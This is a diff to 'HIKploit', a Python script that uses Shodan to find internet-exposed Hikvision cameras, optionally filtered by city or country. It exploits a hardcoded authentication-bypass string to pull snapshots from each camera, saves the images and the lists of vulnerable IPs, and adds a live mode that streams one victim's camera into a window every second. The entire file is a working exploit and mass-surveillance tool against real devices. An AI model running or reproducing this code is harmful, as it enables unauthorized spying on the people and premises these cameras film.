@@ -1,34 +1,32 @@
 #!/bin/python3
 
-import shodan, requests, sys, time, pathlib, tkinter, io, urllib.request
+import shodan, requests, sys, time, pathlib, tkinter, io
 from PIL import Image
 from PIL import ImageTk
 
-
-#Vulnerability utils
+#Vulnerability analysis constants
 HIKVISION_SHODAN_QUERY = "App-webs+200+OK"
 HIKVISION_MAGIC_AUTH = "?auth=YWRtaW46MTEK"
 SNAPSHOT_SUFFIX = "/onvif-http/snapshot"
 
-
-#Arguments
-save_vuln_in_file = False
-filename = ""
+# Data gathering variables
 shodan_api_key = ""
 city_filter = ""
 country_filter = ""
-custom_timeout = 1
-entries_limit = 0
-save_pictures = False
-skip_vuln_check = False
-is_live_mode = False
-
-
-
-#Data variables
+gather_limit = 0
 ipList = []
-ipVuln = []
 
+# Data analysis variables
+filename = ""
+ipVuln = []
+custom_timeout = 1
+
+# Live variables
+live_target = ""
+live_timeout = 1
+show_image = True
+
+# Data gathering functions
 
 def getShodanIPs():
     try:
@@ -42,55 +40,116 @@ def getShodanIPs():
         if country_filter != "":
             query += " +Country:"+country_filter
 
-        # If the entries limit are lower than 100, free search is used
-        # Free search provides upon 100 entries without wasting any token
-        if entries_limit > 100:
-            counter = 0
-            for result in api.search_cursor(query):
-                ipList.append(result['ip_str']+':'+str(result['port']))
-                counter += 1
-                if counter >= entries_limit:
-                    break
+        results = api.search(query)
+        if results['total'] > 100:
+            if  gather_limit == 0: 
+                print('Found a total of {} potentially cameras.'.format(results['total']))
+                print('This exceeds the free 100 entries from Shodan without consuming query tokens')
+                print('Write \'ALL\' to get all tickets (will consume {} tokens)'.format(calcTokens(results['total'])))
+                print('Write \'FREE\' to get the free first 100  entries')
+                print('Write a number to get that number of entries (will consume a token each 100)')
+                handleInput(api, query, results)
+            else:
+                getEntriesWithTokens(gather_limit, api, query)
         else:
-            results = api.search(query)
-            print('{} cameras found.'.format(results['total']))
-            
-            for result in results['matches']:
-                ipList.append(result['ip_str']+':'+str(result['port']))
+            getFreeEntries(api, query)
 
+        if len(ipList) > 0:
+            saveIpList()
+            
     except shodan.APIError as e:
             print('Error: {}'.format(e))
 
+def checkInput(input):
+    try:
+        val = int(input)
+        return val
+    except ValueError:
+        return input.upper()
+
+def handleInput(api, query, results):
+    choice = checkInput(input())
+    if isinstance(choice, int):
+        if choice >= 100:
+            getEntriesWithTokens(choice, api, query)
+        else:
+            print('Please enter a number bigger than 100')
+    else:
+        if choice == 'ALL': 
+            getEntriesWithTokens(calcTokens(results['total']) * 100)
+        elif choice == 'FREE':
+            getFreeEntries(api, query)
+        else:
+            print('Wrong input.')
+
+def calcTokens(entries):
+    while entries % 100 != 0:
+        entries +=1
+    return int(entries / 100)
+
+def getEntriesWithTokens(entryLimit, api, query):
+    global ipList
+    counter = 0
+    for result in api.search_cursor(query):
+        ipList.append(result['ip_str']+':'+str(result['port']))
+        counter += 1
+        if counter == entryLimit:
+            break
+
+def getFreeEntries(api, query):
+    global ipList
+    results = api.search(query)    
+    for result in results['matches']:
+        ipList.append(result['ip_str']+':'+str(result['port']))
+
+def saveIpList():
+    pathlib.Path("target").mkdir(parents=True, exist_ok=True)
+    save_filename = "target/"+time.strftime("%Y%m%d-%H%M%s")+".txt"
+    with open(save_filename, 'w') as f:
+        newline = ''
+        for line in ipList:
+            f.write(newline +line)
+            newline = '\n'
+        f.close()
+    print("File {} created with {} IPs.".format(save_filename, len(ipList)))
+
+# Analysis functions
+
+def readFile():
+    with open(filename, 'r') as f:
+        global ipList
+        ipList = f.read().split('\n')
+    f.close()
 
 def checkIPs(): 
-    print('Looking for vulnerable cameras.')
+    print('Checking for vulnerable cameras.')
     global ipVuln
     ipVuln = []
     idx = 1
     for ip in ipList:
         try:
             response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
-            if save_pictures:
-                saveSnapshot(ip, response)    
-            ipVuln.append(ip)
+            if response.status_code == 200:
+                ipVuln.append(ip)
+                saveSnapshot(ip, response)
+
         except requests.exceptions.RequestException as e:
             pass
         print("Scanned {} of {} IPs.".format(idx,len(ipList)), end="\r")
         idx+=1
-    print("Found {} vulnerable cameras".format(len(ipVuln)))
 
-def saveSnapshot(ip, response=None):
-    if response is None:
-        try:
-            response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
-        except:
-            pass
+    if len(ipVuln) > 0:
+        print("Found {} vulnerable cameras".format(len(ipVuln)))
+        saveVulnInFile()
+    else:
+        print("No vulnerable cameras found.")
 
-    if response is not None and response.status_code == 200:
-        pathlib.Path("snap").mkdir(parents=True, exist_ok=True)
-        with open('snap/'+ip+'.jpg', 'wb' ) as f:
-            f.write(response.content)
-            f.close()
+
+def saveSnapshot(ip, response):
+    pathlib.Path('snap/'+ip).mkdir(parents=True, exist_ok=True)
+    with open('snap/'+ip+'/'+time.strftime("%Y%m%d-%H%M%s")+'.jpg', 'wb' ) as f:
+        f.write(response.content)
+        f.close()
 
 def saveVulnInFile():
     pathlib.Path("vuln").mkdir(parents=True, exist_ok=True)
@@ -101,138 +160,121 @@ def saveVulnInFile():
             f.write(newline +line)
             newline = '\n'
         f.close()
-    print("File {} created.".format(save_filename))
+    print("Vulnerable IPs saved in {}.".format(save_filename))
 
+# Live functions
 
-def readFile():
-    with open(filename, 'r') as f:
-        if skip_vuln_check:
-            global ipVuln
-            ipVuln = f.read().split('\n')
-        else:
-            global ipList
-            ipList = f.read().split('\n')
-        f.close()
+def live(ip):
+    print("Saving snapshots on "+'snap/'+ip+'/')
+    if show_image:
+        root = tkinter.Tk()
+        root.title("HIKploit LIVE {}".format(ip))
+        image = getImageForDraw(ip)
+        widget = tkinter.Label(root, image=image)
+        widget.grid(row=0, column=0)
+        changeImage(widget, ip, root)
+        root.mainloop()
+    else:
+        while True:
+            resp = getLiveImage(ip)
+            if (resp):
+                saveSnapshot(ip, resp)
+            time.sleep(1)
 
+def getLiveImage(ip):
+    global live_timeout
+    try:
+        response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=live_timeout)
+        if response.elapsed.total_seconds() < live_timeout and live_timeout > 1:
+            print("Obtained faster response, decreasing timeout in 1 second ({}).".format(live_timeout -1))
+            live_timeout -= 1
+        return response;
+    except Exception as e:
+        print('A timeout error has occurred. Incrementing timeout 1 second ({}).'.format(live_timeout + 1))
+        live_timeout += 1
+        return None
 
-def getUrlImage(url):
-    global custom_timeout
-    try: 
-        with urllib.request.urlopen('http://'+url+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout) as conn:
-            raw_data = conn.read()
-        im = Image.open(io.BytesIO(raw_data))
+def getImageForDraw(ip):
+    global live_timeout
+
+    resp = getLiveImage(ip)
+    if resp != None:
+        im = Image.open(io.BytesIO(resp.content))
         im = im.resize((1280, 720), Image.ANTIALIAS)
         image = ImageTk.PhotoImage(im)
+        saveSnapshot(ip, resp)
         return image
-    except:
-        if not is_live_mode:
-            print('A timeout error has occurred. You can try to increment it with the -t parameter (currently it is {} second).'.format(custom_timeout))
-        else:
-            print('A timeout error has occurred. Incrementing timeout 1 second (to {} seconds).'.format(custom_timeout + 1))
-            custom_timeout += 1
 
+def changeImage(widget, ip, root):
+    image = getImageForDraw(ip)
+    if show_image:
+        widget.configure(image=image)
+        widget.image = image
+    root.after(1000, lambda: changeImage(widget, ip, root))
 
-def changeImage(widget, url, root):
-    image = getUrlImage(url)
-    widget.configure(image=image)
-    widget.image = image
-    root.after(1000, lambda: changeImage(widget, url, root))
-
-
-def live(url):
-    root = tkinter.Tk()
-    root.title("HIKploit LIVE {}".format(url))
-    image = getUrlImage(url)
-    widget = tkinter.Label(root, image=image)
-    widget.grid(row=0, column=0)
-    changeImage(widget, url, root)
-    root.mainloop()
-
+# Main execution functions
 
 def readArguments():
     # Number of arguments
     n = len(sys.argv)
     # Arguments passed
     for i in range(1, n):
-        #Live
-        if sys.argv[i] == "--live" or sys.argv[i] == "-l":
-            global is_live_mode
-            is_live_mode = True
-            live(sys.argv[i + 1])
-            break
         #Excution type
-        if sys.argv[i] == "--shodan" or sys.argv[i] == "-s":
+        if sys.argv[i] == "--gather" or sys.argv[i] == "-g":
             global shodan_api_key
             shodan_api_key = sys.argv[i+1]
             i+=1
             continue
-        if sys.argv[i] == "--file" or sys.argv[i] == "-f":
+        if sys.argv[i] == "--check" or sys.argv[i] == "-c":
             global filename
             filename = sys.argv[i+1]
             i+=1
             continue
+        if sys.argv[i] == "--live" or sys.argv[i] == "-l":
+            global is_live_mode
+            global live_target
+            is_live_mode = True
+            live_target = sys.argv[i + 1]
+            i+=1
+            continue
+        if sys.argv[i] == "--no-image":
+            global show_image
+            show_image = False;
+            i+=1
+            continue
         #Shodan arguments
         if shodan_api_key != "": 
-            if sys.argv[i] == "--filter-city" or sys.argv[i] == "-c":
+            if sys.argv[i] == "--filter-city":
                 global city_filter
                 city_filter = sys.argv[i+1]
                 i+=1
                 continue
-            if sys.argv[i] == "--filter-country" or sys.argv[i] == "-o":
+            if sys.argv[i] == "--filter-country":
                 global country_filter
                 country_filter = sys.argv[i+1]
                 i+=1
                 continue
-            if sys.argv[i] == "--limit" or sys.argv[i] == "-i":
-                global entries_limit
-                entries_limit = int(sys.argv[i+1])
+            if sys.argv[i] == "--limit":
+                global gather_limit
+                gather_limit = int(sys.argv[i+1])
                 i+=1
                 continue
         
         #Common arguments
-        if sys.argv[i] == "--save-vuln" or sys.argv[i] == "-v":
-                global save_vuln_in_file
-                save_vuln_in_file = True
-                continue
         if sys.argv[i] == "--timeout" or sys.argv[i] == "-t":
                 global custom_timeout
                 custom_timeout = int(sys.argv[i+1])
                 i+=1
                 continue
-        if sys.argv[i] == "--save-pictures" or sys.argv[i] == "-p":
-                global save_pictures
-                save_pictures = True
-                continue
-        if sys.argv[i] == "--skip-vuln-check" or sys.argv[i] == "-k":
-                global skip_vuln_check
-                skip_vuln_check = True
-                continue
-
-
 
 def main():
     readArguments()
     if shodan_api_key != "":
         getShodanIPs()
-        checkIPs()
     elif filename != "":
         readFile()
-        if not skip_vuln_check:
-            checkIPs()
-        elif save_pictures:
-            idx = 1
-            for ip in ipVuln:
-                print("Saving {} of {} snapshots.".format(idx,len(ipVuln)), end="\r")
-                saveSnapshot(ip)
-                idx += 1
-
-
-    if len(ipVuln) > 0 and save_vuln_in_file:
-        saveVulnInFile()
-
-
+        checkIPs()
+    elif is_live_mode:
+        live(live_target)
 
 main()
-
-
-
